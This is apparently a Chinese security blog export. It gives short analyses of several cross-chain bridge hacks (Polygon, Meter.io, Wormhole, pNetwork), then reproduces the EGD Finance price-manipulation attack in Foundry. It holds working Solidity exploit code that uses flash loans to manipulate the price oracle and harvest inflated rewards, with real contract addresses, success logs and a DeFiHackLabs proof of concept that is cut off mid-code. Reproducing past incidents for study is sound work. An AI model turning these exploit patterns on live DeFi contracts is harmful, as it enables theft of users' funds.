<li>超过2/3的验证者签名后将其提交到以太坊，此时用户调用ERC20PredicateBurnOnly合约中的startExitWithBurntTokens()校验checkpoint是否包含burn交易；</li>
<li>校验通过，则铸造一个NFT退款凭证发给用户</li>
<li>用户等待7天挑战期</li>
<li>调用WithdrawManager.processExits()销毁NFT，并退款给用户</li>
</ul>
<p>Polygon为了防止交易重放（双花攻击），使用NFT作为退款凭证，来唯一标识一笔Withdraw交易。但是，由于NFT的ID生成缺陷，造成了攻击者可以构造参数利用同一笔有效的Withdraw交易，生成多个不同ID的NFT，再利用这些NFT进行退款交易，从而实现“双花攻击”。</p>
<ol>
<li>addExitToQueue()会调用_addExitToQueue()铸造一个NFT,NFT的ID是由Plasma Bridge的age优先级生成</li>
<li>WithdrawManager.verifyInclusion()函数对这样的withdraw交易进行校验，并生成对应的age</li>
<li>交易的校验和age的生成过程，都依赖参数data解码出的<strong>branchMaskBytes</strong></li>
<li>交易的校验过程调用_getNibbleArray()对<strong>branceMaskBytes</strong> 进行了转码操作。<br><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161139906.png" alt="在这里插入图片描述"></li>
</ol>
<p>该函数将对应的HP编码，转成对应的Hex编码。</p>
<ol>
<li>如果传入的HP编码后的值b的第一个十六进制位（半个字节）是1或3，就解析第二个十六进制位。否则，就直接忽略第一个字节。</li>
<li>那么如果攻击者构造一个branchMaskBytes参数，使得其第一个十六进制位不等于1和3，则共有14*16 = 224种方式，能够获得相同的转码后的值</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hex转HP</span><br><span class="line">[6,3,6,1,7,4,10]   Hex编码</span><br><span class="line">[20,63,61,74]  HP编码</span><br><span class="line">HP转Hex</span><br><span class="line">[15,23,45,32,62]  HP编码</span><br><span class="line">[5,2,3,4,5,3,2,6,2]Hex编码</span><br><span class="line">[20，45，76，34]HP编码   [23，...]HP编码</span><br><span class="line">[4，5，7，6，3，4，10]Hex编码</span><br></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/565059008">Polygon事件分析CN</a></p>
<p><a href="https://medium.com/immunefi/polygon-double-spend-bug-fix-postmortem-2m-bounty-5a1db09db7f1">Polygon事件分析Eng</a></p>
<h2 id="Meter-io-跨链桥事件"><a href="#Meter-io-跨链桥事件" class="headerlink" title="Meter.io 跨链桥事件"></a>Meter.io 跨链桥事件</h2><p>绕过源链上代币的锁定过程，却获得了代币的锁定证明，进而在目标链铸造资产</p>
<ul>
<li>deposit()用于ERC20代币的存款，depositETH()用于WETH/WBNB代币的存款。</li>
<li>Bridge合约提供了两种方法：deposit()和depositETH()用于上述两种代币的存款，但是deposit()并没有阻止WETH/WBNB的存款交易，并且存在有着缺陷的逻辑判断。</li>
</ul>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161139187.png" alt="在这里插入图片描述"></p>
<p>当<code>tokenAddress</code>不为<code>_wtokenAddress</code>地址时进行 ERC20 代币的销毁或锁定，若为<code>_wtokenAddress</code>则直接跳过该部分处理.</p>
<p>跨链桥合约中的<code>depositETH</code>函数会将链平台币转为<code>wToken</code>后转至<code>depositHandler</code>地址，所以在<code>depositHandler</code>执行<code>deposit</code>逻辑时，已处理过代币转移，故跳过代币处理逻辑</p>
<p>但跨链桥合约的<code>deposit</code>函数中并没有处理代币转移及校验，在转由<code>deposiHandler</code>执行<code>deposit</code>时，若<code>data</code>数据构造成满足<code>tokenAddress == _wtokenAddress</code>即可绕过处理</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5OTg4MTIxMw==&amp;mid=2247493859&amp;idx=1&amp;sn=49e5634b17d3025326c3ddbc8358d41a&amp;chksm=feac8c71c9db056700954938f2bf41511498faf9b94f169c9512ca22fea9155b019d3c4531b4&amp;scene=21#wechat_redirect">慢雾Meter.io跨链桥分析</a></p>
<p><a href="https://blog.csdn.net/SierraW/article/details/122857171">Meter.io跨链桥分析</a></p>
<h2 id="Wormhole-Bridge跨链桥事件"><a href="#Wormhole-Bridge跨链桥事件" class="headerlink" title="Wormhole Bridge跨链桥事件"></a>Wormhole Bridge跨链桥事件</h2><p>利用虚假的签名，在目标链Solana链上mint了12万个WETH。</p>
<p>Wormhole中引入了Validator角色—即<code>guardians</code> </p>
<ul>
<li>Wormhole中没有leader角色，所有的guardians都对其监听到的<code>on-chain event</code>执行相同的计算，同时对<code>Validator Action Approval</code>(VAA)签名。</li>
<li>若有⅔+的大多数guardian节点使用各自私钥对同一event签名，则在所有链上的Wormhole合约都将自动认为其是有效的，并触发相应的mint/burn操作。</li>
</ul>
<ol>
<li>攻击者在Ethereum上向Solana转入0.1ETH</li>
<li>在Solana上铸造Wormhole ETH的交易触发了Wormhole函数complete_wrapped</li>
<li>函数的参数之一是<code>transfer message</code> ,<code>guardians</code> 签名的消息，说明铸造的代币和数量</li>
<li><code>transfer message</code> 是通过触发<code>post_vaa</code>函数创建的，检查<code>guardians</code>的签名来检查消息是否有效</li>
<li>实际上<code>post_vaa</code>并不检查签名，典型的Solana方式，智能合约通过调用<code>verify_signatures</code>函数创建</li>
<li><code>verify_signatures</code> 函数的输入之一是Solana内置的<code>system</code>程序，</li>
<li>在<code>verify_signatures</code>中调用<code>Secp256k1</code>签名验证函数</li>
<li>Wormhole合约使用函数<code>load_instruction_at</code>来检查<code>Secp256k1</code>函数是否被首先调用</li>
<li><code>load_instruction_at</code>函数最近被弃用了，因为它不检查它是否针对实际系统地址执行</li>
<li>攻击者创建自己的账户地址，存储与<code>Instrcutions sysvar</code>相同的数据。</li>
<li>使用这个伪造的<code>system</code>程序，攻击者可以有效地谎报签名检查程序已被执行，但根本没有检查签名</li>
</ol>
<p><a href="https://twitter.com/kelvinfichter/status/1489041221947375616">Wormhole Bridge跨链桥事件</a></p>
<h2 id="pNetwork跨链协议事件"><a href="#pNetwork跨链协议事件" class="headerlink" title="pNetwork跨链协议事件"></a>pNetwork跨链协议事件</h2><p>绕过锁定的过程，攻击者合约发出对应的<strong>lock event</strong> .错误地提取，处理了恶意的日志事件。</p>
<ul>
<li>攻击者部署了一组专门设计的智能合约，来滥用pNetwork节点寻找的peg-out日志事件。</li>
<li>创建一系列的事件日志，包含合法的peg-out请求，和攻击者合约发出了非法peg-out请求。</li>
<li>负责提取这些日志事件的Rust代码存在错误，提取并错误地处理了合法和错误的日志。</li>
</ul>
<p><a href="https://medium.com/pnetwork/pnetwork-post-mortem-pbtc-on-bsc-exploit-170890c58d5f">pNetwork官方报告</a></p>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>跨链桥</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>跨链桥</tag>
      </tags>
  </entry>
  <entry>
    <title>EGD价格操纵攻击foundry复现</title>
    <url>/2023/12/19/EGD%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BBfoundry%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>EGD价格操纵攻击事件的介绍见：<a href="https://emmanuelwh.github.io/2023/12/19/EGD价格操纵攻击原理分析/">EGD价格操纵攻击原理分析—phalcon+etherscan)</a></p>
<p>foundry的介绍可见：<a href="https://learnblockchain.cn/docs/foundry/i18n/zh/forge/writing-tests.html">编写测试 - Foundry 中文文档 (learnblockchain.cn)</a></p>
<p>参考链接：<a href="https://yinhui1984.github.io/analyse_of_egd_finance_attack/">EGD Finance 价格操纵攻击事件分析 - YINHUI’s BLOG (yinhui1984.github.io)</a></p>
<h2 id="1-前情提要以及思路介绍"><a href="#1-前情提要以及思路介绍" class="headerlink" title="1. 前情提要以及思路介绍"></a>1. 前情提要以及思路介绍</h2><p>EGD-Finance项目的主要实现目的：<code>质押USDT一段事件，可提取奖励EGD Token</code>,前文已经说明，由于闪电贷从<code>Pancake LPs</code>池子中借出了大量的USDT，而奖励的<code>EGD Token</code>数量一定程度上依赖于池子中两种代币的数量，从而导致了价格操纵攻击。</p>
<p>由于对foundry不太熟悉，加上没有写过大的solidity项目；</p>
<p>攻击的复现我们分为三部分进行实现：</p>
<ul>
<li>借用闪电贷，实现价格的操纵</li>
<li>实现EGD项目的逻辑，质押后兑换奖励</li>
<li>闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利</li>
</ul>
<h2 id="2-闪电贷实现价格操纵"><a href="#2-闪电贷实现价格操纵" class="headerlink" title="2. 闪电贷实现价格操纵"></a>2. 闪电贷实现价格操纵</h2><ul>
<li>对于想调用的外部合约函数，不仅仅需要它的地址，同时把对应需要调用的函数写成<code>接口interface()</code>的形式，<code>interface()</code>中不写具体的函数代码，函数访问修饰都是external.</li>
<li>solidity中没有浮点型的数，一般乘以的百分比，可以学习一下一般怎么写的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IEGD_Finance &#123;</span><br><span class="line">    function getEGDPrice() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IPancakePair &#123;</span><br><span class="line">    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Pancake借出USDT的池子</span><br><span class="line">address constant EGD_USDT_LPPool = 0xa361433E409Adac1f87CDF133127585F8a93c67d;</span><br><span class="line"></span><br><span class="line">// EGD 代理合约的地址</span><br><span class="line">address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;</span><br><span class="line"></span><br><span class="line">// USDT代币的地址</span><br><span class="line">address constant usdt = 0x55d398326f99059fF775485246999027B3197955;</span><br><span class="line"></span><br><span class="line">contract pricemanipulation is Test&#123;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">    	//fork stake()函数调用前的状态</span><br><span class="line">        vm.createSelectFork(&quot;https://rpc.ankr.com/bsc&quot;, 20_245_522);</span><br><span class="line">        //给账户上初始分配点USDT</span><br><span class="line">        deal(address(usdt),address(this), 30000*1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testPrice() public &#123;</span><br><span class="line">        console.log(&quot;EGD Price before:&quot;, IEGD_Finance(EGD_Finance).getEGDPrice());</span><br><span class="line">        uint amount = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000;</span><br><span class="line">        IPancakePair(EGD_USDT_LPPool).swap(0, amount, address(this), &quot;0x00&quot;);</span><br><span class="line">        console.log(&quot;EGD Price after( return flashloan )&quot;, IEGD_Finance(EGD_Finance).getEGDPrice());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeCall(address sender, uint256 amount1, uint256 amount2, bytes calldata data) public &#123;</span><br><span class="line">    	//闪电贷之前EGD的价格</span><br><span class="line">        console.log(&quot;EGD Price after( flashloan )&quot;, IEGD_Finance(EGD_Finance).getEGDPrice()) ;</span><br><span class="line">        </span><br><span class="line">        //归还相应的本金</span><br><span class="line">        bool success = IERC20(usdt).transfer(address(EGD_USDT_LPPool),(amount2 * 10_500_000_000) / 10_000_000_000) ;</span><br><span class="line">        require(success) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果：表明成功操纵了价格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> /test/attack_test # forge test --match-contract pricemanipulation -vvv</span><br><span class="line">[⠃] Compiling...</span><br><span class="line">No files changed, compilation skipped</span><br><span class="line"></span><br><span class="line">Running 1 test for test/test_pricemanipulation.sol:pricemanipulation</span><br><span class="line">[PASS] testPrice() (gas: 87598)</span><br><span class="line">Logs:</span><br><span class="line">  EGD Price before: 8093644493314726</span><br><span class="line">  EGD Price after( flashloan ) 60702333</span><br><span class="line">  EGD Price after( return flashloan ) 8498326714945346</span><br><span class="line"></span><br><span class="line">Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 576.95ms</span><br><span class="line"> </span><br><span class="line">Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3-实现先质押USDT，后获得EGD奖励"><a href="#3-实现先质押USDT，后获得EGD奖励" class="headerlink" title="3. 实现先质押USDT，后获得EGD奖励"></a>3. 实现先质押USDT，后获得EGD奖励</h2><ul>
<li>这里比较疑惑的一点是，目标函数中userInfo是一个结构体映射，这里接口中将其用函数表示出，用于获取对应的值，希望有佬帮忙讲解一下，这里是interface的用法可以这样写嘛，后续再试一下。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IEGD_Finance &#123;</span><br><span class="line">    function getEGDPrice() external view returns (uint);</span><br><span class="line">    function bond(address invitor) external;</span><br><span class="line">    function stake(uint amount) external;</span><br><span class="line">    function claimAllReward() external;</span><br><span class="line">    function calculateAll(address addr) external view returns (uint);</span><br><span class="line">    function calculateReward(address addr, uint slot) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function userInfo(address) external view returns (        </span><br><span class="line">        uint totalAmount,</span><br><span class="line">        uint totalClaimed,</span><br><span class="line">        address invitor,</span><br><span class="line">        bool isRefer,</span><br><span class="line">        uint refer,</span><br><span class="line">        uint referReward</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// EGD 代理合约的地址</span><br><span class="line">address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;</span><br><span class="line"></span><br><span class="line">// USDT代币的地址</span><br><span class="line">address constant usdt = 0x55d398326f99059fF775485246999027B3197955;</span><br><span class="line"></span><br><span class="line">// EGD代币的地址</span><br><span class="line">address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract stake_reward is Test&#123;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;https://rpc.ankr.com/bsc&quot;, 20_245_522);</span><br><span class="line">        deal(address(usdt),address(this), 30000*1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_stake() public &#123;</span><br><span class="line">		//具体可见EGD-Fiance源码，bond函数填写邀请人</span><br><span class="line">    	IEGD_Finance(EGD_Finance).bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));</span><br><span class="line">    	</span><br><span class="line">    	//stake()过程中会直接继续代币转账，这里需要先approve(没真实写过的话，可能会忘这一步)</span><br><span class="line">        IERC20(usdt).approve(address(EGD_Finance), 100 ether);</span><br><span class="line">        IEGD_Finance(EGD_Finance).stake(100 ether);</span><br><span class="line">        (uint totalAmount, , , , , ) = IEGD_Finance(EGD_Finance).userInfo(address(this));</span><br><span class="line"></span><br><span class="line">        //接下来查看对应的资金</span><br><span class="line">        console.log(&quot;Stake USDT amount:&quot;, totalAmount);</span><br><span class="line">        console.log(&quot;EGD reward: &quot;, IERC20(egd).balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">		// foundry的cheatcode，跳转到某个区块</span><br><span class="line">        vm.warp(block.timestamp + (4 * 60 * 24 * 4));</span><br><span class="line">		</span><br><span class="line">		//获得对应的奖励</span><br><span class="line">        IEGD_Finance(EGD_Finance).claimAllReward();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;EGD reward after 2 days: &quot;, IERC20(egd).balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/test/attack_test # forge test --match-contract stake_reward -vvv</span><br><span class="line">[⠊] Compiling...</span><br><span class="line">[⠰] Compiling 1 files with 0.8.22</span><br><span class="line">[⠒] Solc 0.8.22 finished in 1.28s</span><br><span class="line">Compiler run successful!</span><br><span class="line"></span><br><span class="line">Running 1 test for test/test_stake_reward.sol:stake_reward</span><br><span class="line">[PASS] test_stake() (gas: 865865)</span><br><span class="line">Logs:</span><br><span class="line">  Stake USDT amount: 100000000000000000000</span><br><span class="line">  EGD reward:  0</span><br><span class="line">  EGD reward after 4 days:  18016435864263240000</span><br><span class="line"></span><br><span class="line">Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 591.56ms</span><br><span class="line"> </span><br><span class="line">Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试结果：成功实现了质押USDT，获得EGD的过程</p>
<h2 id="4-闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利"><a href="#4-闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利" class="headerlink" title="4. 闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利"></a>4. 闪电贷实现价格操纵，利用EGD兑换的逻辑漏洞，实现套利</h2><ul>
<li>只是简单地将上述两个步骤糅合在了一起，调用EGD-Finance提取奖励的函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IEGD_Finance &#123;</span><br><span class="line">    function getEGDPrice() external view returns (uint);</span><br><span class="line">    function bond(address invitor) external;</span><br><span class="line">    function stake(uint amount) external;</span><br><span class="line">    function claimAllReward() external;</span><br><span class="line">    function calculateAll(address addr) external view returns (uint);</span><br><span class="line">    function calculateReward(address addr, uint slot) external view returns (uint);</span><br><span class="line">    function userInfo(address) external view returns (        </span><br><span class="line">        uint totalAmount,</span><br><span class="line">        uint totalClaimed,</span><br><span class="line">        address invitor,</span><br><span class="line">        bool isRefer,</span><br><span class="line">        uint refer,</span><br><span class="line">        uint referReward</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IPancakePair &#123;</span><br><span class="line">    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Pancake借出USDT的池子</span><br><span class="line">address constant EGD_USDT_LPPool = 0xa361433E409Adac1f87CDF133127585F8a93c67d;</span><br><span class="line"></span><br><span class="line">// EGD 代理合约的地址</span><br><span class="line">address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;</span><br><span class="line"></span><br><span class="line">// USDT代币的地址</span><br><span class="line">address constant usdt = 0x55d398326f99059fF775485246999027B3197955;</span><br><span class="line"></span><br><span class="line">// EGD代币的地址</span><br><span class="line">address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;</span><br><span class="line"></span><br><span class="line">contract HackerTest is Test&#123;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        vm.createSelectFork(&quot;https://rpc.ankr.com/bsc&quot;, 20_245_522);</span><br><span class="line">        deal(address(usdt),address(this), 30000*1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stake() public &#123;</span><br><span class="line">        IEGD_Finance(EGD_Finance).bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));</span><br><span class="line"></span><br><span class="line">        IERC20(usdt).approve(address(EGD_Finance), 100 ether);</span><br><span class="line">        IEGD_Finance(EGD_Finance).stake(100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_exploit() public &#123;</span><br><span class="line">        stake();</span><br><span class="line">        vm.warp(block.timestamp + (4 * 60 * 24 * 2));</span><br><span class="line"></span><br><span class="line">        console.log(&quot;EGD Price before flashloan:&quot;, IEGD_Finance(EGD_Finance).getEGDPrice());</span><br><span class="line">		</span><br><span class="line">		//计算用户地址，当前存款下获得的奖励数目</span><br><span class="line">        uint totalreward = IEGD_Finance(EGD_Finance).calculateAll(address(this));</span><br><span class="line">        console.log(&quot;Normal EGD reward:&quot;, totalreward);</span><br><span class="line"></span><br><span class="line">        uint amount = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_000_000 / 10_000_000_000;</span><br><span class="line">        IPancakePair(EGD_USDT_LPPool).swap(0, amount, address(this), &quot;0x00&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeCall(address sender, uint256 amount1, uint256 amount2, bytes calldata data) public&#123;</span><br><span class="line"></span><br><span class="line">        console.log(&quot;EGD Price after flashloan: &quot;, IEGD_Finance(EGD_Finance).getEGDPrice());</span><br><span class="line">		</span><br><span class="line">		//提取账户奖励</span><br><span class="line">        IEGD_Finance(EGD_Finance).claimAllReward();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;Hacker&#x27;s EGD balance: &quot;, IERC20(egd).balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        bool success = IERC20(usdt).transfer(address(EGD_USDT_LPPool),(amount2 * 10_500_000_000) / 10_000_000_000) ;</span><br><span class="line">        require(success) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-DefiHacklabs实现的POC介绍"><a href="#5-DefiHacklabs实现的POC介绍" class="headerlink" title="5. DefiHacklabs实现的POC介绍"></a>5. DefiHacklabs实现的POC介绍</h2><ul>
<li>Defihacklabs中的复现，其将大部分常用的<code>interface</code>都保存在了<code>./interface.sol</code>文件中</li>
<li>多了一步，是通过<code>IPancakeRouter</code>这个池子，将套利获得的EGD全部换成USDT，前文分析中已经说明</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// @KeyInfo - Total Lost : ~36,044 US$</span><br><span class="line">// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd</span><br><span class="line">// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7</span><br><span class="line">// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)</span><br><span class="line">// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)</span><br><span class="line">// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</span><br><span class="line"></span><br><span class="line">// @Info</span><br><span class="line">// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254</span><br><span class="line">// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8</span><br><span class="line"></span><br><span class="line">// @Analysis</span><br><span class="line">// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464</span><br><span class="line">// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776</span><br><span class="line"></span><br><span class="line">IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);</span><br><span class="line">IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);</span><br><span class="line">IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));</span><br><span class="line">address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;</span><br><span class="line">address constant usdt = 0x55d398326f99059fF775485246999027B3197955;</span><br><span class="line">address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">    	//fork对应的区块状态</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 20_245_522);</span><br><span class="line"></span><br><span class="line">        vm.label(address(USDT_WBNB_LPPool), &quot;USDT_WBNB_LPPool&quot;);</span><br><span class="line">        vm.label(address(EGD_USDT_LPPool), &quot;EGD_USDT_LPPool&quot;);</span><br><span class="line">        vm.label(address(pancakeRouter), &quot;pancakeRouter&quot;);</span><br><span class="line">        vm.label(EGD_Finance, &quot;EGD_Finance&quot;);</span><br><span class="line">        vm.label(usdt, &quot;USDT&quot;);</span><br><span class="line">        vm.label(egd, &quot;EGD&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        Exploit exploit = new Exploit();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------&quot;);</span><br><span class="line">        console.log(&quot;Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8&quot;);</span><br><span class="line">        console.log(&quot;Attacker Stake 100 USDT to EGD Finance&quot;);</span><br><span class="line">        </span><br><span class="line">        //先实现对应的质押USDT</span><br><span class="line">        exploit.stake();</span><br><span class="line"></span><br><span class="line">        vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)</span><br><span class="line"></span><br><span class="line">        console.log(&quot;-------------------------------- Start Exploit ----------------------------------&quot;);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker USDT Balance&quot;, IERC20(usdt).balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;[INFO] EGD/USDT Price before price manipulation&quot;, IEGD_Finance(EGD_Finance).getEGDPrice(), 18</span><br><span class="line">        );</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;[INFO] Current earned reward (EGD token)&quot;, IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18</span><br><span class="line">        );</span><br><span class="line">        console.log(&quot;Attacker manipulating price oracle of EGD Finance...&quot;);</span><br><span class="line"></span><br><span class="line">        exploit.harvest();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;-------------------------------- End Exploit ----------------------------------&quot;);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[End] Attacker USDT Balance&quot;, IERC20(usdt).balanceOf(address(this)), 18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee </span><br><span class="line">contract Exploit is Test &#123;</span><br><span class="line">    uint256 borrow1;</span><br><span class="line">    uint256 borrow2;</span><br><span class="line"></span><br><span class="line">	//与前文流程一致</span><br><span class="line">    function stake() public &#123;</span><br><span class="line">        // Give exploit contract 100 USDT， 给账户初始复制</span><br><span class="line">        deal(address(usdt), address(this), 100 ether);</span><br><span class="line">        // Set invitor</span><br><span class="line">        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));</span><br><span class="line">        // Stake 100 USDT</span><br><span class="line">        IERC20(usdt).approve(EGD_Finance, 100 ether);</span><br><span class="line">        IEGD_Finance(EGD_Finance).stake(100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function harvest() public &#123;</span><br><span class="line">        console.log(&quot;Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve&quot;);</span><br><span class="line">        borrow1 = 2000 * 1e18;</span><br><span class="line">        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), &quot;0000&quot;);</span><br><span class="line">        console.log(&quot;Flashloan[1] payback success&quot;);</span><br><span class="line">        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	//用不同的calldata，来区分两次闪电贷的过程</span><br><span class="line">    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public &#123;</span><br><span class="line">        if (keccak256(data) == keccak256(&quot;0000&quot;)) &#123;</span><br><span class="line">            console.log(&quot;Flashloan[1] received&quot;);</span><br><span class="line"></span><br><span class="line">            console.log(&quot;Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve&quot;);</span><br><span class="line">            </span><br><span class="line">            //第二次闪电贷借出多少USDT</span><br><span class="line">            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve</span><br><span class="line">            EGD_USDT_LPPool.swap(0, borrow2, address(this), &quot;00&quot;);</span><br><span class="line">            